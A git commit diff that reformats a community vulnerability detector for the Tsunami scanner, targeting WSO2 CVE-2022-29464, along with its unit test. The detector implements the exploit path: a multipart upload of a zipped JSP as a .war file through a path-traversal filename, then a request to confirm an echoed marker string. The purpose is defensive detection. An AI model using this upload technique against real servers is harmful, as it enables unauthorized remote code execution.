75d9f1948dd46c6e68f2f9862e19c7d3850f3516
YuriyPobezhymov <yuradoc@ua.fm>
2023-04-17 14:24:57 +0300

    format code

--- community/detectors/wso2_arbitrary_file_upload_cve_2022_29464/src/main/java/com/google/tsunami/plugins/detectors/rce/cve202229464/Cve202229464VulnDetector.java
+++ community/detectors/wso2_arbitrary_file_upload_cve_2022_29464/src/main/java/com/google/tsunami/plugins/detectors/rce/cve202229464/Cve202229464VulnDetector.java
@@ -15,6 +15,15 @@
  */
 package com.google.tsunami.plugins.detectors.rce.cve202229464;
 
+import static com.google.common.base.Preconditions.checkNotNull;
+import static com.google.common.collect.ImmutableList.toImmutableList;
+import static com.google.common.net.HttpHeaders.CONNECTION;
+import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
+import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
+import static com.google.tsunami.common.net.http.HttpRequest.get;
+import static com.google.tsunami.common.net.http.HttpRequest.post;
+import static java.nio.charset.StandardCharsets.UTF_8;
+
 import com.google.common.annotations.VisibleForTesting;
 import com.google.common.collect.ImmutableList;
 import com.google.common.flogger.GoogleLogger;
@@ -32,12 +41,6 @@ import com.google.tsunami.plugin.PluginType;
 import com.google.tsunami.plugin.VulnDetector;
 import com.google.tsunami.plugin.annotations.PluginInfo;
 import com.google.tsunami.proto.*;
-import okhttp3.MediaType;
-import okhttp3.MultipartBody;
-import okhttp3.RequestBody;
-import okio.Buffer;
-
-import javax.inject.Inject;
 import java.io.ByteArrayOutputStream;
 import java.io.IOException;
 import java.time.Clock;
@@ -45,54 +48,52 @@ import java.time.Duration;
 import java.time.Instant;
 import java.util.zip.ZipEntry;
 import java.util.zip.ZipOutputStream;
-
-import static com.google.common.base.Preconditions.checkNotNull;
-import static com.google.common.collect.ImmutableList.toImmutableList;
-import static com.google.common.net.HttpHeaders.CONNECTION;
-import static com.google.common.net.HttpHeaders.CONTENT_TYPE;
-import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
-import static com.google.tsunami.common.net.http.HttpRequest.get;
-import static com.google.tsunami.common.net.http.HttpRequest.post;
-import static java.nio.charset.StandardCharsets.UTF_8;
+import javax.inject.Inject;
+import okhttp3.MediaType;
+import okhttp3.MultipartBody;
+import okhttp3.RequestBody;
+import okio.Buffer;
 
 /** A {@link VulnDetector} that detects the CVE-2022-29464 vulnerability. */
 @PluginInfo(
-    type = PluginType.VULN_DETECTION,
-    name = "Cve202229464VulnDetector",
-    version = "0.1",
-    description = "This detector checks wide range of WSO2 products RCE (CVE-2022-29464)",
-    author = "yuradoc (yuradoc.research@gmail.com)",
-    bootstrapModule = Cve202229464VulnDetectorBootstrapModule.class)
+        type = PluginType.VULN_DETECTION,
+        name = "Cve202229464VulnDetector",
+        version = "0.1",
+        description = "This detector checks wide range of WSO2 products RCE (CVE-2022-29464)",
+        author = "yuradoc (yuradoc.research@gmail.com)",
+        bootstrapModule = Cve202229464VulnDetectorBootstrapModule.class)
 public final class Cve202229464VulnDetector implements VulnDetector {
-    @VisibleForTesting static final String TEST_STR_RCE = Long.toHexString(Double.doubleToLongBits(Math.random()));
+    @VisibleForTesting
+    static final String TEST_STR_RCE = Long.toHexString(Double.doubleToLongBits(Math.random()));
+
     private static final GoogleLogger logger = GoogleLogger.forEnclosingClass();
     private static final String FILE_UPLOAD_PATH = "fileupload/toolsAny";
     private static final String FILE_NAME =
-        "authenticationendpoint-test" + Long.toHexString(Double.doubleToLongBits(Math.random()));
+            "authenticationendpoint-test" + Long.toHexString(Double.doubleToLongBits(Math.random()));
     private static final String FILE_NAME_EXT = ".war";
     private static final String FILE_REMOTE_LOCATION =
-        "../../../../repository/deployment/server/webapps/" + FILE_NAME;
+            "../../../../repository/deployment/server/webapps/" + FILE_NAME;
     private static final String FUNC_OS_RCE = "echo " + TEST_STR_RCE;
     private static final String FUNC_OS_RCE_PLACEHOLDER = "{{CMD}}";
     private static final int UNPACK_TIMEOUT = 18;
     private final HttpClient httpClient;
     private final Clock utcClock;
     private final String requestBodyTemplate;
+
     @Inject
     Cve202229464VulnDetector(HttpClient httpClient, @UtcClock Clock utcClock) throws IOException {
         this.httpClient = checkNotNull(httpClient);
         this.utcClock = checkNotNull(utcClock);
         requestBodyTemplate =
-            Resources.toString(Resources.getResource(this.getClass(), "requestBody.jsp"), UTF_8);
+                Resources.toString(Resources.getResource(this.getClass(), "requestBody.jsp"), UTF_8);
     }
 
     private static boolean isTungstenHttpsService(NetworkService networkService) {
         return NetworkServiceUtils.getServiceName(networkService).equals("ssl/tungsten-https")
-            || NetworkServiceUtils.getServiceName(networkService).equals("ssl/wso2esb-console");
+                || NetworkServiceUtils.getServiceName(networkService).equals("ssl/wso2esb-console");
     }
 
-    public static byte[] makeZip(String fileName, String content) throws IOException
-    {
+    public static byte[] makeZip(String fileName, String content) throws IOException {
         ByteArrayOutputStream baos = new ByteArrayOutputStream();
         ZipOutputStream zos = new ZipOutputStream(baos);
         ZipEntry zipEntry = new ZipEntry(fileName);
@@ -105,20 +106,21 @@ public final class Cve202229464VulnDetector implements VulnDetector {
 
     @Override
     public DetectionReportList detect(
-        TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
+            TargetInfo targetInfo, ImmutableList<NetworkService> matchedServices) {
         logger.atInfo().log("Cve202229464VulnDetector starts detecting.");
 
         return DetectionReportList.newBuilder()
-            .addAllDetectionReports(
-                matchedServices.stream()
-                    .filter(Cve202229464VulnDetector::isTungstenHttpsService)
-                    .filter(this::isServiceVulnerable)
-                    .map(networkService -> buildDetectionReport(targetInfo, networkService))
-                    .collect(toImmutableList()))
-            .build();
+                .addAllDetectionReports(
+                        matchedServices.stream()
+                                .filter(Cve202229464VulnDetector::isTungstenHttpsService)
+                                .filter(this::isServiceVulnerable)
+                                .map(networkService -> buildDetectionReport(targetInfo, networkService))
+                                .collect(toImmutableList()))
+                .build();
     }
 
-    @VisibleForTesting String buildRootUri(NetworkService networkService) {
+    @VisibleForTesting
+    String buildRootUri(NetworkService networkService) {
         return String.format("https://%s/", toUriAuthority(networkService.getNetworkEndpoint()));
     }
 
@@ -129,45 +131,48 @@ public final class Cve202229464VulnDetector implements VulnDetector {
         String requestBody = requestBodyTemplate.replace(FUNC_OS_RCE_PLACEHOLDER, FUNC_OS_RCE);
 
         try {
-            MultipartBody mBody = new MultipartBody.Builder()
-                .setType(MultipartBody.FORM)
-                .addFormDataPart(FILE_REMOTE_LOCATION + FILE_NAME_EXT,
-                    FILE_REMOTE_LOCATION + FILE_NAME_EXT,
-                    RequestBody.create(
-                        MediaType.parse("application/zip"), makeZip("index.jsp", requestBody)))
-                .build();
+            MultipartBody mBody =
+                    new MultipartBody.Builder()
+                            .setType(MultipartBody.FORM)
+                            .addFormDataPart(
+                                    FILE_REMOTE_LOCATION + FILE_NAME_EXT,
+                                    FILE_REMOTE_LOCATION + FILE_NAME_EXT,
+                                    RequestBody.create(
+                                            MediaType.parse("application/zip"), makeZip("index.jsp", requestBody)))
+                            .build();
 
             Buffer sink = new Buffer();
             mBody.writeTo(sink);
 
-            HttpResponse response = httpClient.send(
-                post(targetUploadUri)
-                    .setHeaders(HttpHeaders.builder()
-                        .addHeader(CONTENT_TYPE, mBody.contentType().toString())
-                        .addHeader(CONNECTION, "close")
-                        .build())
-                    .setRequestBody(ByteString.copyFrom(sink.readByteArray()))
-                    .build(),
-                networkService);
+            HttpResponse response =
+                    httpClient.send(
+                            post(targetUploadUri)
+                                    .setHeaders(
+                                            HttpHeaders.builder()
+                                                    .addHeader(CONTENT_TYPE, mBody.contentType().toString())
+                                                    .addHeader(CONNECTION, "close")
+                                                    .build())
+                                    .setRequestBody(ByteString.copyFrom(sink.readByteArray()))
+                                    .build(),
+                            networkService);
 
             String body = response.bodyString().get();
             if (!(response.status().code() == HttpStatus.OK.code()
-                && body.length() > 0
-                && Double.parseDouble(body) > 0)) {
+                    && body.length() > 0
+                    && Double.parseDouble(body) > 0)) {
                 return false;
             }
 
             Uninterruptibles.sleepUninterruptibly(Duration.ofSeconds(UNPACK_TIMEOUT));
 
-            response = httpClient.send(
-                get(rootUri + FILE_NAME)
-                    .setHeaders(HttpHeaders.builder().build())
-                    .build(),
-                networkService);
+            response =
+                    httpClient.send(
+                            get(rootUri + FILE_NAME).setHeaders(HttpHeaders.builder().build()).build(),
+                            networkService);
 
             if (response.status().code() == HttpStatus.OK.code()
-                && response.bodyString().isPresent()
-                && response.bodyString().get().contains(TEST_STR_RCE)) {
+                    && response.bodyString().isPresent()
+                    && response.bodyString().get().contains(TEST_STR_RCE)) {
                 return true;
             }
         } catch (Exception e) {
@@ -178,33 +183,31 @@ public final class Cve202229464VulnDetector implements VulnDetector {
     }
 
     private DetectionReport buildDetectionReport(
-        TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
+            TargetInfo targetInfo, NetworkService vulnerableNetworkService) {
         return DetectionReport.newBuilder()
-            .setTargetInfo(targetInfo)
-            .setNetworkService(vulnerableNetworkService)
-            .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
-            .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
-            .setVulnerability(
-                Vulnerability.newBuilder()
-                    .setMainId(
-                        VulnerabilityId.newBuilder()
-                            .setPublisher("TSUNAMI_COMMUNITY")
-                            .setValue("CVE-2022-29464"))
-                    .setSeverity(Severity.CRITICAL)
-                    .setTitle("WSO2 Unrestricted Arbitrary File Upload CVE-2022-29464")
-                    .setDescription(
-                        "WSO2 API Manager 2.2.0, up to 4.0.0,"
-                            + "WSO2 Identity Server 5.2.0, up to 5.11.0,"
-                            + "WSO2 Identity Server Analytics 5.4.0, 5.4.1, 5.5.0, 5.6.0,"
-                            + "WSO2 Identity Server as Key Manager 5.3.0, up to 5.11.0,"
-                            + "WSO2 Enterprise Integrator 6.2.0, up to 6.6.0,"
-                            + "WSO2 Open Banking AM 1.4.0, up to 2.0.0,"
-                            + "WSO2 Open Banking KM 1.4.0, up to 2.0.0 contains a arbitrary file upload"
-                            + " vulnerability. Due to improper validation of user input, a malicious actor"
-                            + " could upload an arbitrary file to a user controlled location of the server."
-                            + " By leveraging the arbitrary file upload vulnerability, it is further possible"
-                            + " to gain remote code execution on the server.")
-            )
-            .build();
+                .setTargetInfo(targetInfo)
+                .setNetworkService(vulnerableNetworkService)
+                .setDetectionTimestamp(Timestamps.fromMillis(Instant.now(utcClock).toEpochMilli()))
+                .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
+                .setVulnerability(
+                        Vulnerability.newBuilder()
+                                .setMainId(
+                                        VulnerabilityId.newBuilder()
+                                                .setPublisher("TSUNAMI_COMMUNITY")
+                                                .setValue("CVE-2022-29464"))
+                                .setSeverity(Severity.CRITICAL)
+                                .setTitle("WSO2 Unrestricted Arbitrary File Upload CVE-2022-29464")
+                                .setDescription(
+                                        "WSO2 API Manager 2.2.0, up to 4.0.0,WSO2 Identity Server 5.2.0, up to"
+                                                + " 5.11.0,WSO2 Identity Server Analytics 5.4.0, 5.4.1, 5.5.0, 5.6.0,WSO2"
+                                                + " Identity Server as Key Manager 5.3.0, up to 5.11.0,WSO2 Enterprise"
+                                                + " Integrator 6.2.0, up to 6.6.0,WSO2 Open Banking AM 1.4.0, up to"
+                                                + " 2.0.0,WSO2 Open Banking KM 1.4.0, up to 2.0.0 contains a arbitrary file"
+                                                + " upload vulnerability. Due to improper validation of user input, a"
+                                                + " malicious actor could upload an arbitrary file to a user controlled"
+                                                + " location of the server. By leveraging the arbitrary file upload"
+                                                + " vulnerability, it is further possible to gain remote code execution on"
+                                                + " the server."))
+                .build();
     }
 }
--- community/detectors/wso2_arbitrary_file_upload_cve_2022_29464/src/test/java/com/google/tsunami/plugins/detectors/rce/cve202229464/Cve202229464VuLnDetectorTest.java
+++ community/detectors/wso2_arbitrary_file_upload_cve_2022_29464/src/test/java/com/google/tsunami/plugins/detectors/rce/cve202229464/Cve202229464VuLnDetectorTest.java
@@ -15,6 +15,13 @@
  */
 package com.google.tsunami.plugins.detectors.rce.cve202229464;
 
+import static com.google.common.truth.extensions.proto.ProtoTruth.assertThat;
+import static com.google.tsunami.common.data.NetworkEndpointUtils.forHostnameAndPort;
+import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
+import static com.google.tsunami.plugins.detectors.rce.cve202229464.Cve202229464VulnDetector.TEST_STR_RCE;
+import static org.mockito.Mockito.spy;
+import static org.mockito.Mockito.when;
+
 import com.google.common.collect.ImmutableList;
 import com.google.common.truth.Truth;
 import com.google.inject.Guice;
@@ -23,6 +30,9 @@ import com.google.tsunami.common.net.http.HttpClientModule;
 import com.google.tsunami.common.time.testing.FakeUtcClock;
 import com.google.tsunami.common.time.testing.FakeUtcClockModule;
 import com.google.tsunami.proto.*;
+import java.io.IOException;
+import java.time.Instant;
+import javax.inject.Inject;
 import okhttp3.mockwebserver.MockResponse;
 import okhttp3.mockwebserver.MockWebServer;
 import org.junit.After;
@@ -31,22 +41,11 @@ import org.junit.Test;
 import org.junit.runner.RunWith;
 import org.junit.runners.JUnit4;
 
-import javax.inject.Inject;
-import java.io.IOException;
-import java.time.Instant;
-
-import static com.google.common.truth.extensions.proto.ProtoTruth.assertThat;
-import static com.google.tsunami.common.data.NetworkEndpointUtils.forHostnameAndPort;
-import static com.google.tsunami.common.data.NetworkEndpointUtils.toUriAuthority;
-import static com.google.tsunami.plugins.detectors.rce.cve202229464.Cve202229464VulnDetector.TEST_STR_RCE;
-import static org.mockito.Mockito.spy;
-import static org.mockito.Mockito.when;
-
 /** Unit tests for {@link Cve202229464VulnDetector}. */
 @RunWith(JUnit4.class)
 public final class Cve202229464VuLnDetectorTest {
   private final FakeUtcClock fakeUtcClock =
-      FakeUtcClock.create().setNow(Instant.parse("2022-12-03T00:00:00.00Z"));
+          FakeUtcClock.create().setNow(Instant.parse("2022-12-03T00:00:00.00Z"));
 
   private MockWebServer mockWebServer;
   private NetworkService service;
@@ -57,23 +56,24 @@ public final class Cve202229464VuLnDetectorTest {
   public void setUp() {
     mockWebServer = new MockWebServer();
     Guice.createInjector(
-            new FakeUtcClockModule(fakeUtcClock),
-            new HttpClientModule.Builder().build(),
-            new Cve202229464VulnDetectorBootstrapModule())
-        .injectMembers(this);
+                    new FakeUtcClockModule(fakeUtcClock),
+                    new HttpClientModule.Builder().build(),
+                    new Cve202229464VulnDetectorBootstrapModule())
+            .injectMembers(this);
 
     service =
-        NetworkService.newBuilder()
-            .setNetworkEndpoint(forHostnameAndPort(mockWebServer.getHostName(), mockWebServer.getPort()))
-            .setTransportProtocol(TransportProtocol.TCP)
-            .setServiceName("ssl/tungsten-https")
-            .build();
+            NetworkService.newBuilder()
+                    .setNetworkEndpoint(
+                            forHostnameAndPort(mockWebServer.getHostName(), mockWebServer.getPort()))
+                    .setTransportProtocol(TransportProtocol.TCP)
+                    .setServiceName("ssl/tungsten-https")
+                    .build();
 
     targetInfo =
-        TargetInfo.newBuilder()
-            .addNetworkEndpoints(forHostnameAndPort(mockWebServer.getHostName(), mockWebServer.getPort()))
-            .build();
-
+            TargetInfo.newBuilder()
+                    .addNetworkEndpoints(
+                            forHostnameAndPort(mockWebServer.getHostName(), mockWebServer.getPort()))
+                    .build();
   }
 
   @After
@@ -86,45 +86,42 @@ public final class Cve202229464VuLnDetectorTest {
     Cve202229464VulnDetector mock = spy(detector);
 
     when(mock.buildRootUri(service))
-        .thenReturn(String.format("http://%s/", toUriAuthority(service.getNetworkEndpoint())));
+            .thenReturn(String.format("http://%s/", toUriAuthority(service.getNetworkEndpoint())));
 
-    mockWebServer.enqueue(
-        new MockResponse().setResponseCode(200).setBody("1.651936903609122E12"));
-    mockWebServer.enqueue(
-        new MockResponse().setResponseCode(200).setBody(TEST_STR_RCE));
+    mockWebServer.enqueue(new MockResponse().setResponseCode(200).setBody("1.651936903609122E12"));
+    mockWebServer.enqueue(new MockResponse().setResponseCode(200).setBody(TEST_STR_RCE));
 
     DetectionReportList detectionReports = mock.detect(targetInfo, ImmutableList.of(service));
 
     assertThat(detectionReports.getDetectionReportsList())
-        .containsExactly(
-            DetectionReport.newBuilder()
-                .setTargetInfo(targetInfo)
-                .setNetworkService(service)
-                .setDetectionTimestamp(
-                    Timestamps.fromMillis(Instant.now(fakeUtcClock).toEpochMilli()))
-                .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
-                .setVulnerability(
-                    Vulnerability.newBuilder()
-                        .setMainId(
-                            VulnerabilityId.newBuilder()
-                                .setPublisher("TSUNAMI_COMMUNITY")
-                                .setValue("CVE-2022-29464"))
-                        .setSeverity(Severity.CRITICAL)
-                        .setTitle("WSO2 Unrestricted Arbitrary File Upload CVE-2022-29464")
-                        .setDescription(
-                            "WSO2 API Manager 2.2.0, up to 4.0.0,"
-                                + "WSO2 Identity Server 5.2.0, up to 5.11.0,"
-                                + "WSO2 Identity Server Analytics 5.4.0, 5.4.1, 5.5.0, 5.6.0,"
-                                + "WSO2 Identity Server as Key Manager 5.3.0, up to 5.11.0,"
-                                + "WSO2 Enterprise Integrator 6.2.0, up to 6.6.0,"
-                                + "WSO2 Open Banking AM 1.4.0, up to 2.0.0,"
-                                + "WSO2 Open Banking KM 1.4.0, up to 2.0.0 contains a arbitrary file upload"
-                                + " vulnerability. Due to improper validation of user input, a malicious actor"
-                                + " could upload an arbitrary file to a user controlled location of the server."
-                                + " By leveraging the arbitrary file upload vulnerability, it is further possible"
-                                + " to gain remote code execution on the server.")
-                )
-                .build());
+            .containsExactly(
+                    DetectionReport.newBuilder()
+                            .setTargetInfo(targetInfo)
+                            .setNetworkService(service)
+                            .setDetectionTimestamp(
+                                    Timestamps.fromMillis(Instant.now(fakeUtcClock).toEpochMilli()))
+                            .setDetectionStatus(DetectionStatus.VULNERABILITY_VERIFIED)
+                            .setVulnerability(
+                                    Vulnerability.newBuilder()
+                                            .setMainId(
+                                                    VulnerabilityId.newBuilder()
+                                                            .setPublisher("TSUNAMI_COMMUNITY")
+                                                            .setValue("CVE-2022-29464"))
+                                            .setSeverity(Severity.CRITICAL)
+                                            .setTitle("WSO2 Unrestricted Arbitrary File Upload CVE-2022-29464")
+                                            .setDescription(
+                                                    "WSO2 API Manager 2.2.0, up to 4.0.0,WSO2 Identity Server 5.2.0, up to"
+                                                            + " 5.11.0,WSO2 Identity Server Analytics 5.4.0, 5.4.1, 5.5.0,"
+                                                            + " 5.6.0,WSO2 Identity Server as Key Manager 5.3.0, up to"
+                                                            + " 5.11.0,WSO2 Enterprise Integrator 6.2.0, up to 6.6.0,WSO2 Open"
+                                                            + " Banking AM 1.4.0, up to 2.0.0,WSO2 Open Banking KM 1.4.0, up to"
+                                                            + " 2.0.0 contains a arbitrary file upload vulnerability. Due to"
+                                                            + " improper validation of user input, a malicious actor could"
+                                                            + " upload an arbitrary file to a user controlled location of the"
+                                                            + " server. By leveraging the arbitrary file upload vulnerability,"
+                                                            + " it is further possible to gain remote code execution on the"
+                                                            + " server."))
+                            .build());
 
     Truth.assertThat(mockWebServer.getRequestCount()).isEqualTo(2);
   }
@@ -134,10 +131,9 @@ public final class Cve202229464VuLnDetectorTest {
     Cve202229464VulnDetector mock = spy(detector);
 
     when(mock.buildRootUri(service))
-        .thenReturn(String.format("http://%s/", toUriAuthority(service.getNetworkEndpoint())));
+            .thenReturn(String.format("http://%s/", toUriAuthority(service.getNetworkEndpoint())));
 
-    mockWebServer.enqueue(
-        new MockResponse().setResponseCode(200));
+    mockWebServer.enqueue(new MockResponse().setResponseCode(200));
 
     DetectionReportList detectionReports = mock.detect(targetInfo, ImmutableList.of(service));
     assertThat(detectionReports.getDetectionReportsList()).isEmpty();
